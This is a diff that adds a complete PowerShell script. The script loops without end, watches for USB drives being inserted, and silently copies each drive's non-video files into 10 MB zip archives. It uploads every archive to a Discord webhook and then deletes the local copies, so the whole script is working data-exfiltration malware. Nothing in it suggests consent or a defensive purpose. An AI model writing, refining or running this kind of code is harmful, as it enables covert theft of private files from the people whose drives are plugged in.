@@ -1,0 +1,167 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+$WebhookUrl = $dc
+$MaxZipSize = 10MB
+$OutputDir = "C:\USB_Backups"
+$TempDir = "$OutputDir\Temp"
+$VideoExtensions = @('.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', '.mpg')
+$ProcessedDrives = @{}
+$LastDriveCount = 0
+
+function Send-ToDiscord {
+    param ([string]$FilePath)
+    if (-not (Test-Path $FilePath)) { return }
+    try {
+        # Verify zip file integrity
+        $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
+        $ZipTest.Dispose()
+    } catch {
+        Write-Verbose "Invalid zip file: $FilePath"
+        return
+    }
+
+    $Boundary = [System.Guid]::NewGuid().ToString()
+    $FileName = Split-Path $FilePath -Leaf
+    $FileStream = $null
+    $MemStream = $null
+    $Writer = $null
+    try {
+        $FileStream = [System.IO.File]::OpenRead($FilePath)
+        $MemStream = New-Object System.IO.MemoryStream
+        $Writer = New-Object System.IO.StreamWriter $MemStream
+        $Writer.Write("--$Boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$FileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
+        $Writer.Flush()
+        $FileStream.CopyTo($MemStream)
+        $Writer.Write("`r`n--$Boundary--`r`n")
+        $Writer.Flush()
+        $MemStream.Position = 0
+        $Body = $MemStream.ToArray()
+        $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -Headers $Headers | Out-Null
+    } catch {
+        Write-Verbose "Failed to send to Discord: $_"
+    } finally {
+        if ($Writer) { $Writer.Dispose() }
+        if ($MemStream) { $MemStream.Dispose() }
+        if ($FileStream) { $FileStream.Dispose() }
+    }
+}
+
+function Create-LimitedZip {
+    param (
+        [string]$SourceDir,
+        [string]$ZipPrefix,
+        [long]$MaxSize
+    )
+    $Files = Get-ChildItem -Path $SourceDir -Recurse -File | Where-Object { $VideoExtensions -notcontains $_.Extension.ToLower() }
+    if (-not $Files) { return }
+
+    $CurrentZipSize = 0
+    $ZipIndex = 1
+    $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
+    $Zip = $null
+    $EntryCount = 0
+    try {
+        $Zip = [System.IO.Compression.ZipFile]::Open($CurrentZipPath, "Create")
+        foreach ($File in $Files) {
+            $FileSize = $File.Length
+            if ($CurrentZipSize + $FileSize -gt $MaxSize -and $EntryCount -gt 0) {
+                $Zip.Dispose()
+                $Zip = $null
+                try {
+                    $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
+                    $ZipTest.Dispose()
+                    Send-ToDiscord -FilePath $CurrentZipPath
+                } catch {
+                    Write-Verbose "Failed to process zip: $CurrentZipPath"
+                }
+                if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force -ErrorAction SilentlyContinue }
+                $ZipIndex++
+                $CurrentZipPath = "$OutputDir\$ZipPrefix$ZipIndex.zip"
+                $Zip = [System.IO.Compression.ZipFile]::Open($CurrentZipPath, "Create")
+                $CurrentZipSize = 0
+                $EntryCount = 0
+            }
+            try {
+                $RelativePath = $File.FullName.Substring($SourceDir.Length + 1)
+                $Entry = $Zip.CreateEntry($RelativePath)
+                $EntryStream = $null
+                try {
+                    $EntryStream = $Entry.Open()
+                    $FileStream = $File.OpenRead()
+                    $FileStream.CopyTo($EntryStream)
+                    $EntryStream.Flush()
+                    $CurrentZipSize += $FileSize
+                    $EntryCount++
+                } finally {
+                    if ($FileStream) { $FileStream.Close() }
+                    if ($EntryStream) { $EntryStream.Close() }
+                }
+            } catch {
+                Write-Verbose "Failed to add file to zip: $($File.FullName)"
+            }
+        }
+    } finally {
+        if ($Zip) { $Zip.Dispose() }
+    }
+
+    if ($EntryCount -gt 0) {
+        try {
+            $ZipTest = [System.IO.Compression.ZipFile]::OpenRead($CurrentZipPath)
+            $ZipTest.Dispose()
+            Send-ToDiscord -FilePath $CurrentZipPath
+        } catch {
+            Write-Verbose "Failed to process final zip: $CurrentZipPath"
+        }
+        if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force -ErrorAction SilentlyContinue }
+    } else {
+        if (Test-Path $CurrentZipPath) { Remove-Item $CurrentZipPath -Force -ErrorAction SilentlyContinue }
+    }
+}
+
+# Create output directories
+if (-not (Test-Path $OutputDir)) {
+    New-Item -Path $OutputDir -ItemType Directory | Out-Null
+}
+if (-not (Test-Path $TempDir)) {
+    New-Item -Path $TempDir -ItemType Directory | Out-Null
+}
+
+# Main loop to monitor USB drives
+while ($true) {
+    $Drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
+    $CurrentDriveCount = ($Drives | Measure-Object).Count
+    if ($CurrentDriveCount -ne $LastDriveCount) {
+        $LastDriveCount = $CurrentDriveCount
+        foreach ($Drive in $Drives) {
+            $Serial = $Drive.VolumeSerialNumber
+            if ($Serial -and $ProcessedDrives[$Serial]) { continue }
+            $DriveLetter = $Drive.DeviceID
+            $DriveName = $Drive.VolumeName -replace '[^a-zA-Z0-9]', '_'
+            if (-not $DriveName) { $DriveName = "USB_$DriveLetter" }
+            $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+            $ZipPrefix = "${DriveName}_${Timestamp}_part"
+            $SourcePath = "$DriveLetter\"
+            $TempDriveDir = "$TempDir\$DriveName"
+            if (Test-Path $TempDriveDir) {
+                Remove-Item -Path $TempDriveDir -Recurse -Force -ErrorAction SilentlyContinue
+            }
+            New-Item -Path $TempDriveDir -ItemType Directory | Out-Null
+            try {
+                # Copy files excluding video extensions
+                Copy-Item -Path "$SourcePath\*" -Destination $TempDriveDir -Recurse -Exclude $VideoExtensions -ErrorAction Stop
+                Create-LimitedZip -SourceDir $TempDriveDir -ZipPrefix $ZipPrefix -MaxSize $MaxZipSize
+            } catch {
+                Write-Verbose "Failed to copy files from $SourcePath"
+                continue
+            } finally {
+                if (Test-Path $TempDriveDir) {
+                    Remove-Item -Path $TempDriveDir -Recurse -Force -ErrorAction SilentlyContinue
+                }
+            }
+            if ($Serial) { $ProcessedDrives[$Serial] = 1 }
+        }
+    }
+    Start-Sleep -Seconds 5
+}
